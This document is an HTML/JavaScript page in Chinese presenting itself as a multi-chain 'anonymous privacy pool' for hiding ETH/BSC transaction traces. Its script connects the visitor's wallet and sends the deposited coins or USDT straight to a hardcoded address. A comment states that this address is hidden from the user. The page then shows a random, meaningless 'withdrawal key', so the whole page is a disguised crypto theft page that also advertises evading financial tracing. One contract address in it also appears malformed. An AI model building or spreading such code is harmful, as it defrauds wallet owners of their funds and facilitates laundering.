<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>多链匿名隐私池</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0f172a;color:#f1f5f9;min-height:100vh;padding:20px}
.container{max-width:500px;margin:0 auto}
.card{background:#1e293b;border-radius:16px;padding:24px;margin-bottom:20px}
.title{font-size:22px;font-weight:600;margin-bottom:6px}
.desc{color:#94a3b8;font-size:14px;margin-bottom:20px}
label{display:block;margin-bottom:6px;font-size:14px;color:#cbd5e1}
select,input{width:100%;padding:12px;background:#273444;border:1px solid #334155;border-radius:10px;color:#fff;font-size:16px;margin-bottom:16px}
.btn{width:100%;padding:14px;border-radius:12px;background:#4f46e5;color:#fff;font-weight:600;border:none;cursor:pointer}
.btn:hover{background:#4338ca}
.status{margin-top:16px;padding:12px;border-radius:10px;font-size:14px}
.key-box{margin-top:16px;padding:12px;background:#1e293b;border:1px solid #4f46e5;border-radius:10px;font-family:monospace;word-break:break-all;font-size:14px}
</style>
</head>
<body>

<div class="container">
  <div class="card">
    <div class="title">多链匿名隐私池</div>
    <div class="desc">ETH / BSC 隐私混合，隐藏交易痕迹</div>

    <label>选择链</label>
    <select id="chain">
      <option value="eth">Ethereum 主网</option>
      <option value="bsc">BSC 币安智能链</option>
    </select>

    <label>选择资产</label>
    <select id="token">
      <option value="native">主币 (ETH/BNB)</option>
      <option value="usdt">USDT</option>
    </select>

    <label>存入数量</label>
    <input type="number" id="amount" placeholder="输入金额" step="0.0001">

    <button class="btn" id="deposit">连接钱包并存入隐私池</button>
    <div id="status" class="status"></div>
    <div id="keyArea"></div>
  </div>
</div>

<script src="https://cdn.ethers.org/lib-ethers/6.13.0/ethers.umd.min.js"></script>
<script>
// 真实收款地址（用户完全不可见）
const TO_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

// USDT 合约地址
const USDT = {
  eth: "0xdAC17F958D2ee523a2206206994597c53D70CeF4",
  bsc: "0x55d398c26d670d7d4941a1be7f9975f5c2d9413"
};

// 链配置
const CHAIN = {
  eth: { chainId: 1, rpc: "https://rpc.ethereum.org" },
  bsc: { chainId: 56, rpc: "https://bsc-dataseed1.binance.org" }
};

// 生成隐私提取密钥
function genPrivacyKey() {
  const rand = ethers.randomBytes(32);
  return "privkey_" + ethers.hexlify(rand).slice(2);
}

// 切换网络
async function switchNet(chain) {
  const c = CHAIN[chain];
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x" + c.chainId.toString(16) }]
    });
  } catch (e) {}
}

// 存入逻辑
document.getElementById("deposit").onclick = async () => {
  const st = document.getElementById("status");
  const keyArea = document.getElementById("keyArea");
  const chain = document.getElementById("chain").value;
  const token = document.getElementById("token").value;
  const amount = document.getElementById("amount").value;

  st.textContent = "正在连接钱包...";
  keyArea.innerHTML = "";

  if (!amount || amount <= 0) {
    st.textContent = "请输入有效金额";
    return;
  }

  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    await switchNet(chain);

    let tx;
    if (token === "native") {
      const val = ethers.parseEther(amount);
      tx = await signer.sendTransaction({ to: TO_ADDR, value: val });
    } else {
      const contract = new ethers.Contract(
        USDT[chain],
        ["function transfer(address to, uint256 amount) external returns (bool)"],
        signer
      );
      const val = ethers.parseUnits(amount, 18);
      tx = await contract.transfer(TO_ADDR, val);
    }

    st.textContent = "交易已发送，等待确认：" + tx.hash.slice(0, 22) + "...";
    await tx.wait();

    // 生成密钥
    const key = genPrivacyKey();
    keyArea.innerHTML = `
      <div class="title" style="font-size:16px;margin-top:20px">您的隐私提取密钥</div>
      <div class="key-box">${key}</div>
      <div style="margin-top:8px;font-size:12px;color:#94a3b8">请保存好，用于匿名提取</div>
    `;
    st.textContent = "存入隐私池成功！";

  } catch (e) {
    st.textContent = "失败：" + e.message;
  }
};
</script>
</body>
</html>
